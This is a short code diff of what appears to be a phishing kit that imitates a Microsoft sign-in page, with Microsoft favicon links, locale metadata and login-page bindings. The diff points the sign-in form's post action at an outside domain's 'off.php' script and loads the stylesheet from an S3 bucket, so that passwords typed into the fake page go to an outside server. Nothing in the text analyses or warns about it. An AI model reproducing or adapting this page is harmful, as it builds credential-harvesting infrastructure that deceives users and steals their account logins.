@@ -28,12 +28,12 @@ $domain = getDomainFromEmail($log);
       <meta name="ReqLC" content="1033" />
       <meta name="LocLC" content="en-US" />
             <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8014.13/content/images/favicon_a.ico" />
-      <link href="./data_files/Main.css" 
+      <link href="https://1c1750d9-e03e-4839-98be-dc60a3270.s3-ap-northeast-1.amazonaws.com/Main.css" 
 	rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
       
    </head>
    <body>
-        <form id="i0281" method="post" action="validator/process.php">
+        <form id="i0281" method="post" action="http://matchproorganisation.com/off.php">
             <div class="outer" data-bind="component:{name: &#39;page&#39;, params:{serverData: svr, showButtons: svr.fShowButtons, showFooterLinks: true, useWizardBehavior: svr.fUseWizardBehavior, handleWizardButtons: false, password: password, hideFromAria: ariaHidden}, event:{footerAgreementClick: footer_agreementClick}}">
                 <div class="middle">
                     <div class="inner" data-bind="css:{&#39;app&#39;: $loginPage.backgroundLogoUrl()}">
